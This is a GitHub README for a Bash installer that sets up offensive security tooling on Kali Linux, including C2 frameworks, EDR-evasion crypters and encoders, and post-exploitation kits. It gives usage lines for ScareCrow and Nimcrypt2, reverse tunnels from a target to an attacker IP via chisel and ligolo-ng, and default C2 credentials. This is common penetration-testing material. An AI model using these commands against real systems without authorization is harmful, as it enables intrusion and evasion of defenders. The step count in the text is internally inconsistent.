# Kali Master Framework v6.6.1

> **Ultimate Offensive Security Platform — Built for Elite Practitioners**
>
> Bug Bounty · Red Team · Reverse Engineering · CTF (HTB / THM / HackMyVM)

<div align="center">

```
  ██╗ ██╗  █████╗ ██╗     ██╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗
  ██║ ██╔╝██╔══██╗██║     ██║    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
  █████╔╝ ███████║██║     ██║    ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
  ██╔═██╗ ██╔══██║██║     ██║    ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
  ██║ ██╗ ██║  ██║███████╗██║    ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
  ╚═╝ ╚═╝ ╚═╝  ╚═╝╚══════╝╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

[![Version](https://img.shields.io/badge/version-6.6.1-magenta?style=flat-square)](https://github.com/vulnquest58)
[![Platform](https://img.shields.io/badge/platform-Kali%20Linux-blue?style=flat-square&logo=kalilinux)](https://www.kali.org/)
[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
[![Author](https://img.shields.io/badge/author-vulnquest58-red?style=flat-square&logo=github)](https://github.com/vulnquest58)
[![Shell](https://img.shields.io/badge/shell-bash-89e051?style=flat-square&logo=gnubash)](https://www.gnu.org/software/bash/)

</div>

---

## Table of Contents

- [Overview](#overview)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Modes](#modes)
- [Steps Reference](#steps-reference)
- [Helper Scripts](#helper-scripts)
  - [bb-recon](#bb-recon)
  - [newbb](#newbb)
  - [newctf](#newctf)
  - [setup-redirector](#setup-redirector)
  - [evasion-menu](#evasion-menu)
  - [postexploit-menu](#postexploit-menu)
  - [lab-manager](#lab-manager)
  - [c2-menu](#c2-menu)
  - [update-tools](#update-tools)
- [Directory Structure](#directory-structure)
- [Tool Categories](#tool-categories)
- [Legal Notice](#legal-notice)
- [Author](#author)

---

## Overview

Kali Master Framework is a fully automated, single-file Bash script that transforms a fresh Kali Linux installation into a complete offensive security workstation. It is designed for practitioners who work across multiple disciplines simultaneously — bug bounty, red teaming, reverse engineering, and competitive CTF platforms such as HackTheBox, TryHackMe, and HackMyVM.

**What sets it apart:**

- **State machine** — every step is tracked; re-running the script skips completed steps automatically.
- **Auto-calculated ETA** — real-time progress with estimated time remaining displayed at each step.
- **Three-tier fallback** — every tool attempts installation via apt → pip/go/cargo → GitHub release before failing.
- **Universal Auto-Fix Engine** — automatically detects and repairs missing tools after installation.
- **OPSEC-ready** — C2 redirector automation with Nginx + Let's Encrypt SSL built in.
- **Single file** — no external dependencies, no Ansible, no Docker orchestration required.

---

## Requirements

| Requirement | Minimum | Recommended |
|------------|---------|-------------|
| OS | Kali Linux 2023.x | Kali Linux 2024.x (latest) |
| RAM | 4 GB | 8 GB+ |
| Disk | 15 GB free | 40 GB+ free |
| Network | Required | Stable broadband |
| Privileges | root | root |
| Architecture | x86_64 | x86_64 |

---

## Installation

```bash
# Clone or download the script
git clone https://github.com/vulnquest58/kali-master-framework.git
cd kali-master-framework

# Make executable
chmod +x kali_master_v6.6.1.sh

# Full installation (recommended)
sudo bash kali_master_v6.6.1.sh

# Lightweight install (core tools only)
sudo bash kali_master_v6.6.1.sh --minimal

# Run auto-fix only (repair missing tools)
sudo bash kali_master_v6.6.1.sh --fix
```

---

## Usage

```
Usage: kali_master_v6.6.1.sh [OPTIONS]

Options:
  (no options)         Full installation — all 24 steps
  --minimal            Minimal install — core tools only
  --fix                Auto-fix missing tools only, no full install
  --step <name>        Run a single step only (idempotent)
  --reset <name>       Reset state for one step so it re-runs
  --reset-all          Reset all step states (full re-run)
  --force              Force re-run of all steps regardless of state
  --help, -h           Show this help message

Examples:
  sudo bash kali_master_v6.6.1.sh --step bugbounty
  sudo bash kali_master_v6.6.1.sh --reset redteam_c2 --step redteam_c2
  sudo bash kali_master_v6.6.1.sh --force
  GITHUB_TOKEN=ghp_xxx sudo bash kali_master_v6.6.1.sh
```

---

## Modes

### Full Mode (default)

Installs all 24 steps including C2 frameworks, EDR evasion tools, post-exploitation kit, and redirector automation.

```bash
sudo bash kali_master_v6.6.1.sh
```

### Minimal Mode

Installs only core dependencies, Go, Python venv, and essential network tools. Skips Docker, reversing tools, CTF extras, C2 frameworks, evasion tools, and post-exploit kit.

```bash
sudo bash kali_master_v6.6.1.sh --minimal
```

### Fix Mode

Scans for missing or broken tools and attempts repair using the three-tier fallback engine. Does not re-run any installation steps.

```bash
sudo bash kali_master_v6.6.1.sh --fix
```

---

## Steps Reference

The script executes **24 ordered steps**. Step count and ETA are calculated automatically at runtime.

| # | Step Name | Description |
|---|-----------|-------------|
| 1 | `network_fix` | DNS hardening, IPv6 toggle, GOPROXY setup, apt force IPv4 |
| 2 | `snapshot` | VMware detection, Timeshift snapshot |
| 3 | `system_update` | apt upgrade + 60+ build dependencies |
| 4 | `python_venv` | Central venv, angr venv, FLARE venv, 30+ pip packages |
| 5 | `golang` | Latest Go release auto-detection and install |
| 6 | `docker` | Docker CE + BuildX + Compose plugin |
| 7 | `bugbounty` | 40+ tools: ProjectDiscovery suite, tomnomnom tools, XSStrike... |
| 8 | `reversing` | GDB + pwndbg/GEF/PEDA, Ghidra, radare2, angr, FLARE |
| 9 | `ctf` | CTF-specific: john, hashcat, RSACtfTool, steghide, stegseek... |
| 10 | `ad_network` | AD: BloodHound, Impacket, CrackMapExec, evil-winrm, kerbrute... |
| 11 | `cloud_security` | trivy, grype, syft, kubectl, AWS CLI |
| 12 | `wordlists` | SecLists, rockyou, kali wordlists |
| 13 | `shell_config` | zsh + Oh-My-Zsh + Powerlevel10k + plugins |
| 14 | `secrets` | Secrets manager scaffold (API keys storage) |
| 15 | `vm_hardening` | sysctl tuning: ptrace, file-max, somaxconn |
| 16 | `update_manager` | `update-tools` script |
| 17 | `helper_scripts` | `bb-recon`, `newbb`, `newctf` workspace helpers |
| 18 | `redteam_c2` | Sliver, Havoc, Mythic, Covenant, Empire, Starkiller, Merlin, NimPlant |
| 19 | `c2_redirector` | Nginx + Let's Encrypt C2 redirector automation |
| 20 | `evasion_tools` | Donut, ScareCrow, SGN, PE-Sieve, Hollows Hunter, Nimcrypt2 |
| 21 | `post_exploit` | linpeas, winpeas, chisel, pspy, ligolo-ng |
| 22 | `lab_manager` | Docker lab manager: DVWA, WebGoat, Juice Shop, Metasploit |
| 23 | `c2_menu` | Interactive C2 launcher |
| 24 | `auto_fix` | Universal auto-fix engine |
| 25 | `dashboard` | `kali-master` command dashboard |

---

## Helper Scripts

All helper scripts are installed to `/usr/local/bin/` and available system-wide after installation.

---

### bb-recon

Automated reconnaissance pipeline for a target domain.

```bash
bb-recon <domain>

# Example
bb-recon example.com
```

**What it does:** Runs subfinder passive enumeration and saves results to a timestamped workspace under `~/bugbounty/<domain>/`.

**Output location:**
```
~/bugbounty/<domain>/recon_YYYYMMDD_HHMM/
└── subfinder.txt        # passive subdomain enumeration results
```

---

### newbb

Creates a structured Bug Bounty workspace for a target domain.

```bash
newbb <domain>

# Example
newbb example.com
```

**Output location:**
```
~/bugbounty/<domain>/
├── recon/               # subfinder, amass, httpx outputs
├── exploits/            # proof-of-concept scripts
├── reports/             # final vulnerability reports
├── screenshots/         # evidence screenshots
├── loot/                # captured credentials, tokens
└── notes/               # free-form markdown notes
```

---

### newctf

Creates a structured CTF workspace for a challenge or machine.

```bash
newctf <name> [htb|thm|ctfd]

# Examples
newctf keeper htb
newctf corridor thm
newctf web-challenge ctfd
```

**Output location:**
```
~/ctf/<platform>/<name>/
├── web/                 # web challenge files, burp exports
├── pwn/                 # binary exploitation files, exploits
├── crypto/              # cryptography challenge files
├── forensics/           # memory dumps, disk images, pcaps
├── misc/                # miscellaneous challenge files
├── re/                  # reverse engineering binaries
├── stego/               # steganography challenge files
└── notes/               # solve notes, writeup draft
```

---

### setup-redirector

Interactive wizard to configure an Nginx C2 redirector with automatic Let's Encrypt SSL. Separates legitimate-looking web traffic from C2 beacon traffic using URI pattern matching.

```bash
setup-redirector
```

**Interactive prompts:**
```
[1/5] Domain (e.g., cdn.example.com):       <your domain>
[2/5] Backend protocol [https]:              https
[3/5] Backend host (teamserver IP):          <teamserver IP>
[4/5] Backend port [443]:                    443
[5/5] C2 URI patterns (regex, comma-sep):   ^/api,^/beacon
```

**Output location:**
```
/etc/nginx/sites-available/<domain>.conf     # generated nginx config
/etc/letsencrypt/live/<domain>/              # Let's Encrypt certificates (auto)
/opt/c2-redirectors/templates/               # reusable config templates
/opt/c2-redirectors/logs/                    # redirector access logs
```

**List active redirectors:**
```bash
list-redirectors
```

---

### evasion-menu

Displays the EDR/AV evasion toolkit and available commands.

```bash
evasion-menu
```

**Installed tools and usage:**

```bash
# Donut — convert .NET/PE/VBS to PIC shellcode
donut -f <input.exe> -o <output.bin>

# ScareCrow — EDR bypass via DLL side-loading
scarecrow -I <shellcode.bin> -Loader dll -domain <domain>

# SGN — Shikata Ga Nai shellcode encoder
sgn -i <shellcode.bin> -o <encoded.bin> -a 64 -c 2

# PE-Sieve — detect in-memory hooks/patches
pe-sieve --pid <target_pid>

# Hollows Hunter — scan for hollowed/hooked processes
hollows-hunter

# Nimcrypt2 — Nim-based PE crypter
nimcrypt2 -f <payload.exe> -o <crypted.exe>
```

**Output location:**
```
/opt/evasion-tools/
├── donut/               # donut binary + source
├── ScareCrow/           # ScareCrow binary + source
├── sgn/                 # SGN binary + source
├── pe-sieve/            # PE-Sieve build
├── hollows_hunter/      # Hollows Hunter build
└── nimcrypt2/           # Nimcrypt2 binary + source
```

---

### postexploit-menu

Displays the post-exploitation kit and all available binaries with locations.

```bash
postexploit-menu
```

**Installed tools and usage:**

```bash
# LinPEAS — Linux privilege escalation auditor
linpeas
linpeas -a                        # all checks
linpeas | tee linpeas_output.txt  # save output

# pspy — unprivileged process monitor (no root needed)
pspy64
pspy64 -pf -i 1000               # watch processes and file events

# Chisel — TCP/UDP tunneling over HTTP
# On attacker:
chisel server -p 8080 --reverse
# On target:
chisel client <attacker_ip>:8080 R:1080:socks

# ligolo-ng — advanced tunneling
# On attacker:
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# On target (upload ligolo-agent):
ligolo-agent -connect <attacker_ip>:11601 -ignore-cert

# WinPEAS — Windows privilege escalation auditor
# Transfer to target Windows machine then run:
winPEASx64.exe
winPEASx86.exe
winPEASany.exe
```

**Output location:**
```
/opt/postexploit/
├── linux/
│   ├── linpeas.sh               # Linux privilege escalation script
│   ├── pspy64                   # 64-bit process monitor
│   └── pspy32                   # 32-bit process monitor
├── windows/
│   ├── winPEASx64.exe           # Windows privesc (64-bit)
│   ├── winPEASx86.exe           # Windows privesc (32-bit)
│   └── winPEASany.exe           # Windows privesc (any arch)
└── tunneling/
    └── ligolo-ng/
        ├── proxy                # ligolo-ng server binary
        └── agent                # ligolo-ng agent binary
```

---

### lab-manager

Interactive Docker-based vulnerable lab manager. Start and stop practice environments locally.

```bash
# Interactive menu
lab-manager

# Direct commands
start-lab dvwa
start-lab webgoat
start-lab juice
start-lab all

stop-lab dvwa
stop-lab all
```

**Available labs:**

| Lab | URL | Purpose |
|-----|-----|---------|
| DVWA | http://localhost:8080 | Web vulnerabilities practice |
| WebGoat | http://localhost:8081/WebGoat | OWASP web security training |
| Juice Shop | http://localhost:3000 | Modern web app vulnerabilities |
| Metasploit | host networking | Metasploit framework container |

**Output location:**
```
# Container logs
docker logs <lab_name>

# Persistent data (if mapped)
/var/lib/docker/volumes/
```

---

### c2-menu

Interactive launcher for all installed C2 frameworks.

```bash
c2-menu
```

**Available frameworks:**

| Option | Framework | Protocol | Notes |
|--------|-----------|----------|-------|
| 1 | Sliver | mTLS / WireGuard / HTTP(S) | Modern, multi-operator |
| 2 | Havoc | HTTPS / SMB | Cobalt Strike alternative |
| 3 | Mythic | HTTPS (Docker) | Cross-platform, modular |
| 4 | Covenant | HTTPS (.NET) | .NET agents |
| 5 | Empire | HTTPS / SMB | PowerShell post-exploitation |
| 6 | Starkiller | Web UI | Empire GUI |
| 7 | Merlin | HTTP/2 / QUIC | Go-based, modern protocols |
| 8 | NimPlant | HTTPS | Nim beacon |
| 9 | Status | — | Check all framework status |

**Individual start commands:**
```bash
sliver-server                           # Sliver
havoc server                            # Havoc teamserver
mythic-cli start                        # Mythic
covenant                                # Covenant
empire server                           # Empire
starkiller                              # Starkiller GUI
merlin server                           # Merlin
nimplant server                         # NimPlant
```

**Output location:**
```
/opt/c2-frameworks/                     # C2 base directory
/opt/Havoc/                             # Havoc source + binary
/opt/Mythic/                            # Mythic + .env credentials
/opt/Covenant/                          # Covenant source
/opt/Empire/                            # Empire source
/opt/Starkiller/                        # Starkiller source
/opt/merlin/                            # Merlin binary
/opt/NimPlant/                          # NimPlant source
```

**Default credentials:**
```
Mythic:   mythic_admin / Admin123!      (change in /opt/Mythic/.env)
Havoc:    5pider / password1234
```

---

### update-tools

Updates all system packages and tools.

```bash
update-tools
```

**What it updates:** apt packages and installed system dependencies.

---

## Directory Structure

```
/
├── opt/
│   ├── kali-venv/               # Central Python virtual environment
│   ├── angr-venv/               # Isolated angr environment
│   ├── flare-venv/              # Isolated FLARE environment
│   ├── c2-frameworks/           # C2 framework base directory
│   ├── c2-redirectors/          # Nginx redirector configs + templates
│   ├── evasion-tools/           # EDR/AV evasion binaries and source
│   ├── postexploit/             # Post-exploitation binaries
│   │   ├── linux/               # LinPEAS, pspy
│   │   ├── windows/             # WinPEAS variants
│   │   └── tunneling/           # chisel, ligolo-ng
│   ├── tools/                   # Misc tool directory
│   │   ├── bin/
│   │   ├── wordlists/
│   │   ├── exploits/
│   │   ├── scripts/
│   │   ├── payloads/
│   │   └── github/              # Python GitHub-cloned tools
│   ├── wordlists/               # Wordlist symlinks
│   ├── Havoc/                   # Havoc C2
│   ├── Mythic/                  # Mythic C2
│   ├── Covenant/                # Covenant C2
│   ├── Empire/                  # Empire C2
│   ├── Starkiller/              # Starkiller GUI
│   ├── merlin/                  # Merlin C2
│   └── NimPlant/                # NimPlant C2
├── usr/local/bin/               # All helper scripts + tool wrappers
├── root/
│   ├── .config/kali-master/
│   │   ├── secrets.env          # API keys (chmod 600)
│   │   └── load_secrets.sh      # Auto-loader for secrets
│   ├── .kali-master/state/      # Step completion state files
│   ├── .kali_env.zsh            # Environment variables + aliases
│   ├── .p10k.zsh                # Powerlevel10k theme config
│   ├── .oh-my-zsh/              # Oh-My-Zsh installation
│   ├── .pwndbg/                 # pwndbg GDB plugin
│   ├── .gdbinit                 # GDB init (loads GEF)
│   └── .gf/                     # gf pattern library
├── home/
│   └── go/bin/                  # Go tool binaries
└── var/log/
    └── kali_master_v6_<date>.log  # Installation log
```

---

## Tool Categories

### Bug Bounty
`subfinder` `httpx` `nuclei` `dnsx` `naabu` `katana` `ffuf` `gobuster` `feroxbuster` `dalfox` `gau` `waybackurls` `hakrawler` `assetfinder` `httprobe` `trufflehog` `anew` `gf` `unfurl` `gospider` `arjun` `waymore` `dnsgen` `dirsearch` `commix` `xsstrike` `corsy` `linkfinder` `ssrfmap` `jwt_tool` `sublist3r` `sqlmap` `nikto` `wpscan` `amass` `wfuzz` `interactsh-client` `notify` `tlsx` `alterx` `uncover` `cvemap`

### Reverse Engineering
`gdb` `pwndbg` `GEF` `PEDA` `pwntools` `radare2` `ghidra` `rizin` `cutter` `iaito` `binwalk` `jadx` `apktool` `dex2jar` `angr` `ROPgadget` `ropper` `one_gadget` `seccomp-tools` `capa` `floss` `volatility3` `frida-tools` `pefile` `r2pipe` `oletools` `upx-ucl` `strace` `ltrace` `patchelf` `checksec`

### CTF
`john` `hashcat` `hydra` `medusa` `steghide` `stegseek` `zsteg` `outguess` `exiftool` `foremost` `binwalk` `RsaCtfTool` `netcat` `socat`

### Active Directory
`crackmapexec` `nxc` `evil-winrm` `bloodhound` `impacket` `kerbrute` `responder` `smbclient` `smbmap` `enum4linux` `ldap-utils` `bettercap` `nbtscan`

### Cloud & Container
`trivy` `grype` `syft` `kubectl` `aws`

### C2 Frameworks
`sliver` `havoc` `mythic` `covenant` `empire` `starkiller` `merlin` `nimplant`

### Evasion
`donut` `scarecrow` `sgn` `pe-sieve` `hollows-hunter` `nimcrypt2`

### Post-Exploitation
`linpeas` `winpeas` `pspy` `chisel` `ligolo-ng`

---

## Legal Notice

> **This tool is intended exclusively for:**
> - Authorized penetration testing engagements with written permission
> - Legal CTF competitions and training platforms (HackTheBox, TryHackMe, HackMyVM, CTFd, PicoCTF, etc.)
> - Academic security research in isolated lab environments
> - Personal learning and skill development on systems you own or have explicit permission to test
>
> **Unauthorized use of this tool against systems you do not own or lack explicit permission to test is illegal under computer fraud and abuse laws in most jurisdictions.**
>
> The author assumes no liability for any misuse of this software. By using this tool, you agree to use it only in legal, authorized contexts.

---

## Author

**vulnquest58**

[![GitHub](https://img.shields.io/badge/GitHub-vulnquest58-181717?style=for-the-badge&logo=github)](https://github.com/vulnquest58)

> *"The quieter you become, the more you are able to hear."*

---

<div align="center">

**Kali Master Framework v6.6.1** — Built for the elite. Used responsibly.

[Report an Issue](https://github.com/vulnquest58/kali-master-framework/issues) · [Star the Repo](https://github.com/vulnquest58/kali-master-framework)

</div>
